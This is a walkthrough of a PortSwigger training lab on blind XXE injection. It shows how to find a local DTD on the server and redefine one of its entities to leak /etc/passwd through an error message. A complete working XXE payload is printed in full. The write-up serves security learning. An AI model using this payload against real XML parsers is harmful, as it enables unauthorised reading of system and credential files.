# Exploiting XXE to retrieve data by repurposing a local DTD

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd), you'll learn: Exploiting XXE to retrieve data by repurposing a local DTD! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★☆☆☆☆☆☆

## Background

This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, trigger an error message containing the contents of the `/etc/passwd` file.

You'll need to reference an existing DTD file on the server and redefine an entity from it.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-9/images/Pasted%20image%2020221225073630.png)

In previous labs, we found that **there is an XXE injection vulnerability in "Check stock" feature, which parses XML input.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-9/images/Pasted%20image%2020221225073702.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-9/images/Pasted%20image%2020221225073715.png)

**Original XML data:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-9/images/Pasted%20image%2020221225073802.png)

**Invalid XML data:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>a</productId>
    <storeId>1</storeId>
</stockCheck>
```

However, it does not display the result, which indicates that this is a blind XXE injection.

**To exploit blind XXE injection, we could leverage a local DTD.**

But first, we need to locate a suitable DTD.

**To do so, we can enumerate local DTD files via:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % local_dtd SYSTEM "file:///file.dtd"> %local_dtd; ]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

**Let's try `/usr/share/yelp/dtd/docbookx.dtd`, which is a common DTD file in GNOME desktop environment:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-9/images/Pasted%20image%2020221225074809.png)

**Hmm... No error. What if I provide an invalid DTD file?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-9/images/Pasted%20image%2020221225074839.png)

The web server couldn't find that DTD file.

So, let's use `/usr/share/yelp/dtd/docbookx.dtd` as our local DTD file!

**Next, let's inspect that file:**
```xml
<!ENTITY % ISOamsa PUBLIC
"ISO 8879:1986//ENTITIES Added Math Symbols: Arrow Relations//EN//XML"
"isoamsa.ent">
<!ENTITY % ISOamsb PUBLIC
"ISO 8879:1986//ENTITIES Added Math Symbols: Binary Operators//EN//XML"
"isoamsb.ent">
<!ENTITY % ISOamsc PUBLIC
"ISO 8879:1986//ENTITIES Added Math Symbols: Delimiters//EN//XML"
"isoamsc.ent">
<!ENTITY % ISOamsn PUBLIC
"ISO 8879:1986//ENTITIES Added Math Symbols: Negated Relations//EN//XML"
"isoamsn.ent">
<!ENTITY % ISOamso PUBLIC
"ISO 8879:1986//ENTITIES Added Math Symbols: Ordinary//EN//XML"
"isoamso.ent">
<!ENTITY % ISOamsr PUBLIC
"ISO 8879:1986//ENTITIES Added Math Symbols: Relations//EN//XML"
"isoamsr.ent">
<!ENTITY % ISObox PUBLIC
"ISO 8879:1986//ENTITIES Box and Line Drawing//EN//XML"
"isobox.ent">
<!ENTITY % ISOcyr1 PUBLIC
"ISO 8879:1986//ENTITIES Russian Cyrillic//EN//XML"
"isocyr1.ent">
<!ENTITY % ISOcyr2 PUBLIC
"ISO 8879:1986//ENTITIES Non-Russian Cyrillic//EN//XML"
"isocyr2.ent">
<!ENTITY % ISOdia PUBLIC
"ISO 8879:1986//ENTITIES Diacritical Marks//EN//XML"
"isodia.ent">
<!ENTITY % ISOgrk1 PUBLIC
"ISO 8879:1986//ENTITIES Greek Letters//EN//XML"
"isogrk1.ent">
<!ENTITY % ISOgrk2 PUBLIC
"ISO 8879:1986//ENTITIES Monotoniko Greek//EN//XML"
"isogrk2.ent">
<!ENTITY % ISOgrk3 PUBLIC
"ISO 8879:1986//ENTITIES Greek Symbols//EN//XML"
"isogrk3.ent">
<!ENTITY % ISOgrk4 PUBLIC
"ISO 8879:1986//ENTITIES Alternative Greek Symbols//EN//XML"
"isogrk4.ent">
<!ENTITY % ISOlat1 PUBLIC
"ISO 8879:1986//ENTITIES Added Latin 1//EN//XML"
"isolat1.ent">
<!ENTITY % ISOlat2 PUBLIC
"ISO 8879:1986//ENTITIES Added Latin 2//EN//XML"
"isolat2.ent">
<!ENTITY % ISOnum PUBLIC
"ISO 8879:1986//ENTITIES Numeric and Special Graphic//EN//XML"
"isonum.ent">
<!ENTITY % ISOpub PUBLIC
"ISO 8879:1986//ENTITIES Publishing//EN//XML"
"isopub.ent">
<!ENTITY % ISOtech PUBLIC
"ISO 8879:1986//ENTITIES General Technical//EN//XML"
"isotech.ent">
%ISOamsa;
%ISOamsb;
%ISOamsc;
%ISOamsn;
%ISOamso;
%ISOamsr;
%ISObox;
%ISOcyr1;
%ISOcyr2;
%ISOdia;
%ISOgrk1;
%ISOgrk2;
%ISOgrk3;
%ISOgrk4;
%ISOlat1;
%ISOlat2;
%ISOnum;
%ISOpub;
%ISOtech;
```

As you can see, it contains **entities called `ISOxxxx`.**

**Then, we can repurpose one of those entities!**

**Let's pick `ISOamso`:**
```xml
<!DOCTYPE foo [ 
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

**The above XXE payload will:**

- Define an XML parameter entity called `local_dtd`, containing the contents of the external DTD file that exists on the server filesystem.
- Redefine the XML parameter entity called `ISOamso`, which is already defined in the external DTD file. The entity is redefined as containing the [error-based XXE exploit](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages) that was already described, for triggering an error message containing the contents of the `/etc/passwd` file.
- Use the `local_dtd` entity, so that the external DTD is interpreted, including the redefined value of the `custom_entity` entity. This results in the desired error message.

**Complete payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

**Let's send our payload!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/XXE-Injection/XXE-9/images/Pasted%20image%2020221225075716.png)

Boom! We did it!

# What we've learned:

1. Exploiting XXE to retrieve data by repurposing a local DTD